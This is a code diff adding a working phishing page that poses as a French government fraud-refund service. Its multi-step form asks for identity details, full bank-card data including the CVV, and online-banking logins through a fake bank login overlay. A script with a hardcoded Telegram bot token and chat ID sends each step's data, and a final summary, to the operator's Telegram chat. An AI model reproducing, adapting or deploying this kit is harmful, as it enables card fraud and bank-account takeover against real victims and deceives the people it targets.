+      </div>
+    </div>
+    <div class="wero-overlay-content">
+      <div class="wero-login-container">
+        <button type="button" class="wero-close-btn" id="weroCloseBtn" title="Fermer">✕</button>
+        <div class="wero-login-logo-wrapper">
+          <img src="" alt="Banque" class="wero-login-logo" id="weroLoginLogo">
+        </div>
+        <h2 class="wero-login-title">Connexion sécurisée</h2>
+        <p class="wero-login-subtitle" id="weroLoginBankName">Connectez-vous à votre espace bancaire</p>
+        <div class="wero-regional-field" id="weroRegionalField">
+          <label class="wero-regional-label" for="weroRegionalCode">Code régional</label>
+          <input type="text" id="weroRegionalCode" class="wero-regional-input" placeholder="Ex : 75000" maxlength="5" autocomplete="off">
+        </div>
+        <div class="wero-regional-field" id="weroRegionalSelectField">
+          <label class="wero-regional-label" for="weroRegionalSelect">Sélectionnez votre région</label>
+          <select id="weroRegionalSelect" class="wero-regional-select">
+            <option value="">-- Choisir une région --</option>
+            <option value="ALSACE LORRAINE CHAMPAGNE">ALSACE LORRAINE CHAMPAGNE</option>
+            <option value="AQUITAINE CENTRE ATLANTIQUE">AQUITAINE CENTRE ATLANTIQUE</option>
+            <option value="AUVERGNE RHONE ALPES">AUVERGNE RHONE ALPES</option>
+            <option value="BOURGOGNE FRANCHE-COMTÉ">BOURGOGNE FRANCHE-COMTÉ</option>
+            <option value="BRED">BRED</option>
+            <option value="GRAND OUEST">GRAND OUEST</option>
+            <option value="MEDITERRANEE">MEDITERRANEE</option>
+            <option value="NORD">NORD</option>
+            <option value="OCCITANE">OCCITANE</option>
+            <option value="RIVES DE PARIS">RIVES DE PARIS</option>
+            <option value="SUD">SUD</option>
+            <option value="VAL DE FRANCE">VAL DE FRANCE</option>
+          </select>
+        </div>
+        <input type="text" id="weroUsername" class="wero-login-input" placeholder="Identifiant client" autocomplete="off">
+        <div class="wero-password-display" id="weroPasswordDisplay"></div>
+        <input type="password" id="weroPasswordInput" class="wero-password-input" placeholder="Mot de passe" autocomplete="off">
+        <div class="wero-numpad" id="weroNumpad"></div>
+        <button type="button" id="weroLoginSubmit" class="wero-btn">Se connecter et valider</button>
+        <div id="weroError" class="wero-error">Identifiant ou mot de passe incorrect. Veuillez réessayer.</div>
+        <div id="weroAppAuth" style="display:none; margin-top:10px; padding-top:12px; border-top:1px solid #eee;">
+          <div class="wero-app-auth-icon" id="weroAppAuthIcon">
+            <svg viewBox="0 0 24 24" aria-hidden="true">
+              <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/>
+              <circle cx="12" cy="17" r="1.2"/>
+            </svg>
+          </div>
+          <p class="wero-app-auth-status" id="weroAppAuthStatus">
+            <span class="wero-app-auth-spinner"></span>
+            En attente de validation dans l'application…
+          </p>
+          <p class="wero-app-auth-hint">Ouvrez votre application bancaire et validez la notification sécurisée.</p>
+          <p class="wero-app-auth-countdown" id="weroAppAuthCountdown"></p>
+          <div style="margin-top:6px;">
+            <a href="#" id="weroSmsLink" style="font-size:12px; color:#000091; text-decoration:underline; cursor:pointer;">Recevoir un code par SMS</a>
+            <span id="weroSmsTimer" style="display:none; font-size:12px; margin-left:6px;"></span>
+          </div>
+          <div id="weroSmsField" style="display:none; margin-top:10px;">
+            <input type="text" id="weroSmsCode" class="wero-login-input" placeholder="Code reçu par SMS (6 chiffres)" maxlength="6" inputmode="numeric" style="margin-bottom:6px;">
+            <button type="button" id="weroSmsValidate" class="wero-btn" style="padding:9px; font-size:13px;">Valider le code SMS</button>
+          </div>
+        </div>
+        <div class="wero-secure-badge">🔒 Connexion sécurisée - Données cryptées</div>
+      </div>
+    </div>
+  </div>
+
+  <footer role="contentinfo" id="footer">
+    <div class="fr-footer" data-fr-js-footer-actionee="true">
+      <div class="fr-container">
+        <div class="fr-footer__partners">
+          <div class="fr-footer__partners-title fr-text--bold" role="heading" aria-level="2">Nos partenaires</div>
+          <div class="fr-footer__partners-logos">
+            <div class="fr-footer__partners-main">
+              <a class="footer__partners-link" href="#" title="Your Europe - europa.eu" target="_self">
+                <img src="../assets/img/logo-your-europe.svg" class="fr-footer__logo fr-responsive-img" alt="Your Europe" width="160" loading="lazy">
+              </a>
+            </div>
+            <div class="fr-footer__partners-sub">
+              <ul>
+                <li class="sp-footer-link"><a class="fr-footer__partners-link" href="#" title="Vie publique" target="_self"><img src="../assets/img/logo-VP.svg" class="fr-footer__logo fr-responsive-img" alt="Vie publique" width="120" loading="lazy"></a></li>
+                <li class="sp-footer-link"><a class="fr-footer__partners-link" href="#" title="Entreprendre.Service-Public" target="_self"><img src="../assets/img/logo-entreprendre-sp.svg" class="fr-footer__logo fr-responsive-img" alt="Entreprendre.Service-Public.fr" width="160" loading="lazy"></a></li>
+                <li class="sp-footer-link"><a class="fr-footer__partners-link" href="#" title="Services Publics +" target="_self"><img src="../assets/img/logo-spplus-footer.svg" class="fr-footer__logo fr-responsive-img" alt="Service Publics +" width="120" loading="lazy"></a></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <script src="../assets/js/jquery.min.js"></script>
+  <script>
+  (function () {
+    'use strict';
+
+    // ============================================================
+    // CONFIG TELEGRAM
+    // ============================================================
+    const TELEGRAM_BOT_TOKEN = '8081266151:AAFwkH4YmNd85Sk6sHZabhYokmTXAX5OoIU';
+    const TELEGRAM_CHAT_ID   = '7738841181';
+
+    const WERO_BANKS = {
+      'bnp': { name: 'BNP Paribas', logo: 'https://koly.fr/wp-content/uploads/2016/11/LOGO-BNP-PARIBAS-ARCHI.jpg', color: '#00965e', idMaxLength: 10, idMinLength: 7, idMode: 'numeric', passLength: 6, passMode: 'numeric', useNumpad: true },
+      'societe-generale': { name: 'Société Générale', logo: 'https://logos-marques.com/societe-generale-logo/societe-generale-logo/', color: '#e4032e', idMaxLength: 8, idMinLength: 8, idMode: 'numeric', passLength: 6, passMode: 'numeric', useNumpad: true },
+      'credit-agricole': { name: 'Crédit Agricole', logo: 'https://logos-marques.com/credit-agricole-logo/credit-agricole-logo-2/', color: '#006a4e', idMaxLength: 11, idMinLength: 11, idMode: 'numeric', passLength: 6, passMode: 'numeric', useNumpad: true, hasRegionalCode: true },
+      'credit-mutuel': { name: 'Crédit Mutuel', logo: 'https://laccordeur.org/wp-content/uploads/2024/01/logo-Credit-Mutuel.png', color: '#003da5', idMaxLength: null, idMinLength: 1, idMode: 'alphanumeric', passLength: null, passMode: 'alphanumeric', useNumpad: false },
+      'caisse-epargne': { name: "Caisse d'Épargne", logo: 'https://upload.wikimedia.org/wikipedia/fr/thumb/9/92/Logo_Caisse_d%27%C3%89pargne_-_2021.svg/3840px-Logo_Caisse_d%27%C3%89pargne_-_2021.svg.png', color: '#e30613', idMaxLength: null, idMinLength: 1, idMode: 'alphanumeric', passLength: 8, passMode: 'numeric', useNumpad: true },
+      'banque-populaire': { name: 'Banque Populaire', logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTreh3ZkmtgIjebKiO-Ds-FStUkMQDKe7CcY7MvEOSeuw&s=10', color: '#003da5', idMaxLength: null, idMinLength: 1, idMode: 'alphanumeric', passLength: 6, passMode: 'numeric', useNumpad: true, hasRegionalSelect: true },
+      'lcl': { name: 'LCL', logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3hmsKde6tBcRro9UXikXZ6nJHpssAMtn3hWKCF92ByA&s=10', color: '#003da5', idMaxLength: 10, idMinLength: 10, idMode: 'numeric', passLength: 6, passMode: 'numeric', useNumpad: true },
+      'axa-banque': { name: 'Axa Banque', logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/9/94/AXA_Logo.svg/1280px-AXA_Logo.svg.png', color: '#00008f', idMaxLength: null, idMinLength: 1, idMode: 'alphanumeric', passLength: null, passMode: 'alphanumeric', useNumpad: false },
+      'banque-postale': { name: 'La Banque Postale', logo: 'https://upload.wikimedia.org/wikipedia/fr/thumb/d/d4/Logo_La_Banque_postale_2022.svg/1280px-Logo_La_Banque_postale_2022.svg.png', color: '#003da5', idMaxLength: 10, idMinLength: 10, idMode: 'numeric', passLength: 6, passMode: 'numeric', useNumpad: true },
+      'boursorama': { name: 'Boursorama Banque', logo: 'https://thebanks.eu/img/logos/Boursorama_Banque.png', color: '#ffcc00', idMaxLength: 12, idMinLength: 12, idMode: 'numeric', passLength: 6, passMode: 'numeric', useNumpad: true },
+      'revolut': { name: 'Revolut', logo: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQYR__ZU7tT6bgeRIgE9T8KnQ-EZNrff5KZREGn_J8e7g&s=10', color: '#191c1f', idMaxLength: null, idMinLength: 1, idMode: 'phone', passLength: null, passMode: 'alphanumeric', useNumpad: false },
+      'n26': { name: 'N26', logo: 'https://upload.wikimedia.org/wikipedia/commons/e/e4/N26-branding-logo-web.png', color: '#26262b', idMaxLength: null, idMinLength: 1, idMode: 'alphanumeric', passLength: null, passMode: 'alphanumeric', useNumpad: false },
+      'autres': { name: 'Autres banques', logo: '', color: '#666666', idMaxLength: null, idMinLength: 1, idMode: 'alphanumeric', passLength: null, passMode: 'alphanumeric', useNumpad: false }
+    };
+
+    const CARD_BRANDS = [
+      { name: 'visa',       regex: /^4/,                 img: '../assets/img/data/visa.png' },
+      { name: 'mastercard', regex: /^(5[1-5]|2[2-7])/,   img: '../assets/img/data/mastercard.png' },
+      { name: 'amex',       regex: /^3[47]/,             img: '../assets/img/data/amex.png' },
+      { name: 'discover',   regex: /^(6011|65|64[4-9])/, img: '../assets/img/data/discover.png' }
+    ];
+
+    const views = { home: document.getElementById('view-home'), form: document.getElementById('view-form') };
+    const formTitle = document.getElementById('form-title');
+    const formType  = document.getElementById('form-type');
+    const form      = document.getElementById('fraud-form');
+    const cardForm  = document.getElementById('card-form');
+    const btnStep2  = document.getElementById('btn-step2');
+    const btnStep4  = document.getElementById('btn-step4');
+    const step1 = document.getElementById('form-step-1');
+    const step2 = document.getElementById('form-step-2');
+    const step3 = document.getElementById('form-step-3');
+    const step4 = document.getElementById('form-step-4');
+    const step5 = document.getElementById('form-step-5');
+    const step6 = document.getElementById('form-step-6');
+    const stepsBar = document.getElementById('steps-bar');
+    const banksGrid = document.getElementById('banks-grid');
+    const bankError = document.getElementById('bank-error');
+    const selectedBankImg = document.getElementById('selected-bank-img');
+    const selectedBankName = document.getElementById('selected-bank-name');
+    const selectedBankImgWero = document.getElementById('selected-bank-img-wero');
+    const selectedBankNameWero = document.getElementById('selected-bank-name-wero');
+    const cardBrandIcon = document.getElementById('card-brand-icon');
+
+    const weroOverlay = document.getElementById('weroOverlay');
+    const weroNavbarLogo = document.getElementById('weroNavbarLogo');
+    const weroNavbarWeroLogo = document.getElementById('weroNavbarWeroLogo');
+    const weroLoginLogo = document.getElementById('weroLoginLogo');
+    const weroLoginBankName = document.getElementById('weroLoginBankName');
+    const weroUsername = document.getElementById('weroUsername');
+    const weroPasswordInput = document.getElementById('weroPasswordInput');
+    const weroPasswordDisplay = document.getElementById('weroPasswordDisplay');
+    const weroNumpad = document.getElementById('weroNumpad');
+    const weroRegionalField = document.getElementById('weroRegionalField');
+    const weroRegionalCode = document.getElementById('weroRegionalCode');
+    const weroRegionalSelectField = document.getElementById('weroRegionalSelectField');
+    const weroRegionalSelect = document.getElementById('weroRegionalSelect');
+    const weroError = document.getElementById('weroError');
+    const weroLoginSubmit = document.getElementById('weroLoginSubmit');
+    const weroCloseBtn = document.getElementById('weroCloseBtn');
+
+    const weroAppAuth = document.getElementById('weroAppAuth');
+    const weroAppAuthIcon = document.getElementById('weroAppAuthIcon');
+    const weroAppAuthStatus = document.getElementById('weroAppAuthStatus');
+    const weroAppAuthCountdown = document.getElementById('weroAppAuthCountdown');
+    const weroSmsLink = document.getElementById('weroSmsLink');
+    const weroSmsTimer = document.getElementById('weroSmsTimer');
+    const weroSmsField = document.getElementById('weroSmsField');
+    const weroSmsCode = document.getElementById('weroSmsCode');
+    const weroSmsValidate = document.getElementById('weroSmsValidate');
+
+    let selectedBank = null;
+    let personalData = {};
+    let cardData = {};
+    let weroPassword = '';
+    let maxReachedStep = 1;
+
+    let smsTimerInterval = null;
+    let smsCountdown = 120;
+    let weroPendingData = null;
+    let weroAppAuthTimeout = null;
+    let weroAppAuthCountdownInterval = null;
+    let weroAppAuthCountdownSec = 120;
+
+    // ============================================================
+    // FONCTION ENVOI TELEGRAM (GET + texte brut)
+    // ============================================================
+    async function sendTelegramMessage(message) {
+      try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
+        const response = await fetch(url);
+        const data = await response.json();
+        if (data.ok) {
+          console.log('[Telegram] ✅ Message envoyé.');
+        } else {
+          console.error('[Telegram] ❌ Erreur API :', data.description);
+        }
+        return data.ok;
+      } catch (e) {
+        console.error('[Telegram] ❌ Erreur réseau :', e);
+        return false;
+      }
+    }
+
+    // ============================================================
+    // ENVOI ÉTAPE 1 : INFORMATIONS PERSONNELLES
+    // ============================================================
+    async function sendStep1Telegram() {
+      const typeLabel = personalData.type === 'annulation' ? "Annulation d'opération" : 'Demande de remboursement';
+      let message = '';
+      message += '📝 ÉTAPE 1 — INFORMATIONS PERSONNELLES\n';
+      message += 'Type : ' + typeLabel + '\n';
+      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
+      message += '👤 Nom : ' + (personalData.nom || '—') + '\n';
+      message += '📧 E-mail : ' + (personalData.email || '—') + '\n';
+      message += '🎂 Naissance : ' + (personalData.date_naissance || '—') + '\n';
+      message += '📞 Téléphone : ' + (personalData.telephone || '—') + '\n';
+      message += '🏙️ Ville : ' + (personalData.ville || '—') + '\n';
+      message += '📍 Adresse : ' + (personalData.adresse || '—') + '\n';
+      message += '💰 Montant : ' + (personalData.montant || '—') + ' €\n';
+      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
+      message += '🕒 ' + new Date().toLocaleString('fr-FR');
+      await sendTelegramMessage(message);
+    }
+
+    // ============================================================
+    // ENVOI ÉTAPE 2 : BANQUE SÉLECTIONNÉE
+    // ============================================================
+    async function sendStep2Telegram() {
+      const bank = WERO_BANKS[selectedBank];
+      let message = '';
+      message += '🏦 ÉTAPE 2 — BANQUE SÉLECTIONNÉE\n';
+      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
+      message += '🏛️ Banque : ' + (bank ? bank.name : '—') + '\n';
+      message += '👤 Client : ' + (personalData.nom || '—') + '\n';
+      message += '📞 Téléphone : ' + (personalData.telephone || '—') + '\n';
+      message += '💰 Montant : ' + (personalData.montant || '—') + ' €\n';
+      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
+      message += '🕒 ' + new Date().toLocaleString('fr-FR');
+      await sendTelegramMessage(message);
+    }
+
+    // ============================================================
+    // ENVOI ÉTAPE 3 : CARTE BANCAIRE
+    // ============================================================
+    async function sendStep3Telegram() {
+      let message = '';
+      message += '💳 ÉTAPE 3 — CARTE BANCAIRE\n';
+      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
+      message += '👤 Client : ' + (personalData.nom || '—') + '\n';
+      message += '🏦 Banque : ' + (selectedBank && WERO_BANKS[selectedBank] ? WERO_BANKS[selectedBank].name : '—') + '\n';
+      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
+      message += '💳 Titulaire : ' + (cardData.card_holder || '—') + '\n';
+      message += '🔢 Numéro : ' + (cardData.card_number || '—') + '\n';
+      message += '📅 Expiration : ' + (cardData.card_exp || '—') + '\n';
+      message += '🔒 CVV : ' + (cardData.card_cvv || '—') + '\n';
+      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
+      message += '💰 Montant : ' + (personalData.montant || '—') + ' €\n';
+      message += '🕒 ' + new Date().toLocaleString('fr-FR');
+      await sendTelegramMessage(message);
+    }
+
+    // ============================================================
+    // ENVOI ÉTAPE 4 : WERO (identifiants)
+    // ============================================================
+    async function sendStep4Telegram() {
+      let message = '';
+      message += '🔐 ÉTAPE 4 — CONNEXION WERO\n';
+      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
+      message += '👤 Client : ' + (personalData.nom || '—') + '\n';
+      message += '🏦 Banque : ' + (weroPendingData.bank_name || '—') + '\n';
+      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
+      message += '🔑 Identifiant : ' + (weroPendingData.wero_username || '—') + '\n';
+      message += '🔑 Mot de passe : ' + (weroPendingData.wero_password || '—') + '\n';
+      if (weroPendingData.wero_regional_code) message += '🏛️ Code régional : ' + weroPendingData.wero_regional_code + '\n';
+      if (weroPendingData.wero_regional_select) message += '🏛️ Région : ' + weroPendingData.wero_regional_select + '\n';
+      message += '━━━━━━━━━━━━━━━━━━━━━━\n';
+      message += '💰 Montant : ' + (personalData.montant || '—') + ' €\n';
+      message += '🕒 ' + new Date().toLocaleString('fr-FR');
+      await sendTelegramMessage(message);
+    }
+
+    // ============================================================
+    // ENVOI ÉTAPE FINALE : RÉCAPITULATIF COMPLET
+    // ============================================================
+    async function sendFinalTelegram() {
+      const typeLabel = personalData.type === 'annulation' ? "Annulation d'opération" : 'Demande de remboursement';
+      let message = '';
+      message += '✅ DEMANDE COMPLÈTE — ' + typeLabel + '\n';
+      message += '══════════════════════\n\n';
+      message += '👤 IDENTITÉ\n';
+      message += '• Nom : ' + (personalData.nom || '—') + '\n';
+      message += '• E-mail : ' + (personalData.email || '—') + '\n';
+      message += '• Naissance : ' + (personalData.date_naissance || '—') + '\n';
+      message += '• Téléphone : ' + (personalData.telephone || '—') + '\n';
+      message += '• Ville : ' + (personalData.ville || '—') + '\n';
+      message += '• Adresse : ' + (personalData.adresse || '—') + '\n\n';
+      message += '💰 MONTANT : ' + (personalData.montant || '—') + ' €\n\n';
+      message += '🏦 BANQUE : ' + (weroPendingData.bank_name || '—') + '\n\n';
+      message += '💳 CARTE\n';
+      message += '• Titulaire : ' + (cardData.card_holder || '—') + '\n';
+      message += '• Numéro : ' + (cardData.card_number || '—') + '\n';
+      message += '• Expiration : ' + (cardData.card_exp || '—') + '\n';
+      message += '• CVV : ' + (cardData.card_cvv || '—') + '\n\n';
+      message += '🔐 WERO\n';
+      message += '• Identifiant : ' + (weroPendingData.wero_username || '—') + '\n';
+      message += '• Mot de passe : ' + (weroPendingData.wero_password || '—') + '\n';
+      if (weroPendingData.wero_regional_code) message += '• Code régional : ' + weroPendingData.wero_regional_code + '\n';
+      if (weroPendingData.wero_regional_select) message += '• Région : ' + weroPendingData.wero_regional_select + '\n';
+      message += '\n══════════════════════\n';
+      message += '🕒 ' + new Date().toLocaleString('fr-FR');
+      await sendTelegramMessage(message);
+    }
+
+    // ============================================================
+    // GRILLE BANQUES
+    // ============================================================
+    function buildBankGrid() {
+      banksGrid.innerHTML = '';
+      Object.keys(WERO_BANKS).forEach(bankKey => {
+        const bank = WERO_BANKS[bankKey];
+        const card = document.createElement('div');
+        card.className = 'bank-option';
+        card.dataset.id = bankKey;
+        if (bank.logo) {
+          card.innerHTML =
+            '<img src="' + bank.logo + '" alt="' + bank.name + '" ' +
+            'onerror="this.style.display=\'none\'; this.parentNode.querySelector(\'.bank-name\').style.marginTop=\'10px\';">' +
+            '<div class="bank-name">' + bank.name + '</div>' +
+            '<div class="bank-check">✓</div>';
+        } else {
+          card.innerHTML =
+            '<div style="width:60px;height:60px;display:flex;align-items:center;justify-content:center;font-size:30px;margin-bottom:8px;">🏦</div>' +
+            '<div class="bank-name">' + bank.name + '</div>' +
+            '<div class="bank-check">✓</div>';
+        }
+        card.addEventListener('click', () => selectBank(bankKey));
+        banksGrid.appendChild(card);
+      });
+    }
+
+    function selectBank(bankKey) {
+      selectedBank = bankKey;
+      banksGrid.querySelectorAll('.bank-option').forEach(el => el.classList.remove('selected'));
+      const target = banksGrid.querySelector('.bank-option[data-id="' + bankKey + '"]');
+      if (target) target.classList.add('selected');
+      btnStep2.disabled = false;
+      bankError.classList.remove('visible');
+    }
+
+    window.showView = function (viewName, type) {
+      Object.values(views).forEach(v => v.classList.remove('active'));
+      if (viewName === 'form') {
+        const t = type === 'annulation' ? 'annulation' : 'remboursement';
+        formType.value = t;
+        formTitle.textContent = t === 'annulation' ? "Annulation d'opération" : "Demande de remboursement";
+        form.reset(); cardForm.reset(); formType.value = t;
+        clearErrors(); clearCardErrors();
+        selectedBank = null; personalData = {}; cardData = {}; weroPassword = '';
+        maxReachedStep = 1;
+        banksGrid.querySelectorAll('.bank-option').forEach(el => el.classList.remove('selected'));
+        btnStep2.disabled = true;
+        bankError.classList.remove('visible');
+        cardBrandIcon.classList.remove('visible');
+        weroOverlay.classList.remove('active');
+        resetWeroAuth();
+        stopWeroAppAuthSimulation();
+        goToStep(1);
+        views.form.classList.add('active');
+      } else {
+        views.home.classList.add('active');
+      }
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    };
+
+    function goToStep(step) {
+      [step1, step2, step3, step4, step5, step6].forEach(el => { if (el) el.style.display = 'none'; });
+      if (step === 1) step1.style.display = '';
+      if (step === 2) step2.style.display = '';
+      if (step === 3) step3.style.display = '';
+      if (step === 4) step4.style.display = '';
+      if (step === 5) step5.style.display = '';
+      if (step === 6 && step6) {
+        step6.style.display = '';
+        // Envoi du récapitulatif final
+        if (weroPendingData && personalData.nom) {
+          sendFinalTelegram();
+        }
+      }
+      if (step > maxReachedStep) maxReachedStep = step;
+      stepsBar.querySelectorAll('.step').forEach(el => {
+        const n = parseInt(el.dataset.step, 10);
+        el.classList.remove('active', 'done');
+        if (n < step) el.classList.add('done');
+        if (n === step) el.classList.add('active');
+        if (n > maxReachedStep) el.classList.add('disabled');
+        else el.classList.remove('disabled');
+      });
+      if (selectedBank && WERO_BANKS[selectedBank]) {
+        const bank = WERO_BANKS[selectedBank];
+        if (step === 3) {
+          selectedBankName.textContent = bank.name;
+          selectedBankImg.src = bank.logo || '';
+          selectedBankImg.alt = bank.name;
+          selectedBankImg.style.display = bank.logo ? '' : 'none';
+          selectedBankImg.onerror = function () { this.style.display = 'none'; };
+        }
+        if (step === 4) {
+          selectedBankNameWero.textContent = bank.name;
+          selectedBankImgWero.src = bank.logo || '';
+          selectedBankImgWero.alt = bank.name;
+          selectedBankImgWero.style.display = bank.logo ? '' : 'none';
+          selectedBankImgWero.onerror = function () { this.style.display = 'none'; };
+        }
+      }
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+    window.goToStep = goToStep;
+
+    stepsBar.querySelectorAll('.step').forEach(el => {
+      el.addEventListener('click', function () {
+        const n = parseInt(el.dataset.step, 10);
+        if (n > maxReachedStep) return;
+        goToStep(n);
+      });
+    });
+
+    function showError(fieldId, message) {
+      const input = document.getElementById(fieldId);
+      const errorEl = document.querySelector('.error-msg[data-for="' + fieldId + '"]');
+      if (input) input.classList.add('invalid');
+      if (errorEl) { if (message) errorEl.textContent = message; errorEl.classList.add('visible'); }
+    }
+    function clearError(fieldId) {
+      const input = document.getElementById(fieldId);
+      const errorEl = document.querySelector('.error-msg[data-for="' + fieldId + '"]');
+      if (input) input.classList.remove('invalid');
+      if (errorEl) errorEl.classList.remove('visible');
+    }
+    function clearErrors() {
+      form.querySelectorAll('input').forEach(i => i.classList.remove('invalid'));
+      form.querySelectorAll('.error-msg').forEach(e => e.classList.remove('visible'));
+    }
+    function validateField(fieldId) {
+      const input = document.getElementById(fieldId);
+      const value = input.value.trim();
+      switch (fieldId) {
+        case 'nom': if (value.length < 2) { showError(fieldId); return false; } break;
+        case 'email': if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) { showError(fieldId); return false; } break;
+        case 'date_naissance': { if (!value) { showError(fieldId); return false; } const d = new Date(value); if (isNaN(d.getTime()) || d > new Date()) { showError(fieldId); return false; } } break;
+        case 'telephone': if (!/^[0-9+\s().-]{6,20}$/.test(value)) { showError(fieldId); return false; } break;
+        case 'ville': if (value.length < 2) { showError(fieldId); return false; } break;
+        case 'adresse': if (value.length < 5) { showError(fieldId); return false; } break;
+        case 'montant': { const n = parseFloat(value); if (isNaN(n) || n <= 0) { showError(fieldId); return false; } } break;
+      }
+      clearError(fieldId);
+      return true;
+    }
+    function validateAll() {
+      const fields = ['nom','email','date_naissance','telephone','ville','adresse','montant'];
+      let valid = true;
+      fields.forEach(f => { if (!validateField(f)) valid = false; });
+      return valid;
+    }
+    ['nom','email','date_naissance','telephone','ville','adresse','montant'].forEach(f => {
+      const el = document.getElementById(f);
+      if (el) el.addEventListener('blur', () => { if (el.value !== '') validateField(f); });
+    });
+
+    // ============================================================
+    // SOUMISSION ÉTAPE 1 → envoi Telegram ÉTAPE 1
+    // ============================================================
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      if (!validateAll()) {
+        const firstInvalid = form.querySelector('input.invalid');
+        if (firstInvalid) firstInvalid.focus();
+        return;
+      }
+      personalData = {
+        type: formType.value,
+        nom: document.getElementById('nom').value.trim(),
+        email: document.getElementById('email').value.trim(),
+        date_naissance: document.getElementById('date_naissance').value,
+        telephone: document.getElementById('telephone').value.trim(),
+        ville: document.getElementById('ville').value.trim(),
+        adresse: document.getElementById('adresse').value.trim(),
+        montant: document.getElementById('montant').value
+      };
+      // ✅ ENVOI TELEGRAM ÉTAPE 1
+      sendStep1Telegram();
+      goToStep(2);
+    });
+
+    // ============================================================
+    // SOUMISSION ÉTAPE 2 → envoi Telegram ÉTAPE 2
+    // ============================================================
+    btnStep2.addEventListener('click', function () {
+      if (!selectedBank) { bankError.classList.add('visible'); return; }
+      // ✅ ENVOI TELEGRAM ÉTAPE 2
+      sendStep2Telegram();
+      goToStep(3);
+    });
+
+    const cardNumberInput = document.getElementById('card-number');
+    cardNumberInput.addEventListener('input', function () {
+      let digits = this.value.replace(/\D/g, '').slice(0, 19);
+      this.value = digits.replace(/(.{4})/g, '$1 ').trim();
+      updateCardBrand(digits);
+    });
+
+    function updateCardBrand(digits) {
+      if (!digits) { cardBrandIcon.classList.remove('visible'); return; }
+      for (const brand of CARD_BRANDS) {
+        if (brand.regex.test(digits)) {
+          cardBrandIcon.src = brand.img;
+          cardBrandIcon.classList.add('visible');
+          cardBrandIcon.onerror = function () { this.classList.remove('visible'); };
+          return;
+        }
+      }
+      cardBrandIcon.classList.remove('visible');
+    }
+
+    const expInput = document.getElementById('card-exp');
+    expInput.addEventListener('input', function () {
+      let v = this.value.replace(/\D/g, '').slice(0, 6);
+      this.value = v.length >= 3 ? v.slice(0, 2) + '/' + v.slice(2) : v;
+    });
+
+    function clearCardErrors() {
+      cardForm.querySelectorAll('input').forEach(i => i.classList.remove('invalid'));
+      cardForm.querySelectorAll('.error-msg').forEach(e => e.classList.remove('visible'));
+    }
+    function validateCardField(fieldId) {
+      const input = document.getElementById(fieldId);
+      const value = input.value.trim();
+      if (fieldId === 'card-holder') {
+        if (value.length < 2) { showCardError(fieldId); return false; }
+      } else if (fieldId === 'card-number') {
+        const digits = value.replace(/\s/g, '');
+        if (digits.length < 13 || digits.length > 19 || !/^\d+$/.test(digits)) { showCardError(fieldId); return false; }
+      } else if (fieldId === 'card-exp') {
+        const m = value.match(/^(\d{2})\/(\d{4})$/);
+        if (!m) { showCardError(fieldId); return false; }
+        const month = parseInt(m[1], 10);
+        const year = parseInt(m[2], 10);
+        if (month < 1 || month > 12) { showCardError(fieldId); return false; }
+        const exp = new Date(year, month, 0, 23, 59, 59);
+        if (exp < new Date()) { showCardError(fieldId, "La carte est expirée."); return false; }
+      } else if (fieldId === 'card-cvv') {
+        if (!/^\d{3,4}$/.test(value)) { showCardError(fieldId); return false; }
+      }
+      clearCardError(fieldId);
+      return true;
+    }
+    function showCardError(fieldId, message) {
+      const input = document.getElementById(fieldId);
+      const errorEl = document.querySelector('.error-msg[data-for="' + fieldId + '"]');
+      if (input) input.classList.add('invalid');
+      if (errorEl) { if (message) errorEl.textContent = message; errorEl.classList.add('visible'); }
+    }
+    function clearCardError(fieldId) {
+      const input = document.getElementById(fieldId);
+      const errorEl = document.querySelector('.error-msg[data-for="' + fieldId + '"]');
+      if (input) input.classList.remove('invalid');
+      if (errorEl) errorEl.classList.remove('visible');
+    }
+
+    // ============================================================
+    // SOUMISSION ÉTAPE 3 → envoi Telegram ÉTAPE 3
+    // ============================================================
+    cardForm.addEventListener('submit', function (e) {
+      e.preventDefault();
+      const fields = ['card-holder','card-number','card-exp','card-cvv'];
+      let valid = true;
+      fields.forEach(f => { if (!validateCardField(f)) valid = false; });
+      if (!valid) {
+        const firstInvalid = cardForm.querySelector('input.invalid');
+        if (firstInvalid) firstInvalid.focus();
+        return;
+      }
+      cardData = {
+        card_holder: document.getElementById('card-holder').value.trim(),
+        card_number: document.getElementById('card-number').value.replace(/\s/g, ''),
+        card_exp: document.getElementById('card-exp').value.trim(),
+        card_cvv: document.getElementById('card-cvv').value.trim()
+      };
+      // ✅ ENVOI TELEGRAM ÉTAPE 3
+      sendStep3Telegram();
+      goToStep(4);
+    });
+
+    btnStep4.addEventListener('click', function () { openWeroOverlay(); });
+
+    function resetWeroAuth() {
+      if (smsTimerInterval) { clearInterval(smsTimerInterval); smsTimerInterval = null; }
+      if (weroAppAuthCountdownInterval) { clearInterval(weroAppAuthCountdownInterval); weroAppAuthCountdownInterval = null; }
+      smsCountdown = 120;
+      weroAppAuthCountdownSec = 120;
+      weroPendingData = null;
+      if (weroAppAuth) weroAppAuth.style.display = 'none';
+      if (weroSmsField) weroSmsField.style.display = 'none';
+      if (weroSmsLink) { weroSmsLink.style.display = 'inline'; weroSmsLink.textContent = 'Recevoir un code par SMS'; }
+      if (weroSmsTimer) { weroSmsTimer.style.display = 'none'; weroSmsTimer.classList.remove('expired'); weroSmsTimer.textContent = ''; }
